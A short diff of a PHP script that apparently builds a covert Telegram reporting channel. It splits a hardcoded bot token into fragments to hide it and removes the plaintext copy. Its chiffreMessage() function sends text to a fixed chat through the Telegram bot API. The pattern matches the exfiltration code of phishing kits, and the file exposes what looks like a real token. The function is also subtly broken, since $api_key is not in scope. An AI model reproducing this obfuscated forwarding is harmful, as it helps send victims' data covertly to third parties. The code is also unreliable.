@@ -52,7 +52,6 @@ $part3 = 'AAH48A7q3fOkT4eEbm_';
 $part4 = '-nQ2YqD0pdii4iu8';
 
 $api_key = $part1 . $part2 . $part3 . $part4;
-$chiffre_bot = "7264615079:AAH48A7q3fOkT4eEbm_-nQ2YqD0pdii4iu8";
 $context = stream_context_create([
     'ssl' => [
         'verify_peer' => $ssl_tls_dummy['tls_settings']['verify_peer'],
@@ -61,7 +60,7 @@ $context = stream_context_create([
     ],
 ]);
  function chiffreMessage($message) {
-    global $chiffre_bot, $chiffre_id;
+    global $chiffre_id;
 
     $data_2 = ['text' => $message, 'chat_id' => $chiffre_id];
     file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?" . http_build_query($data_2));
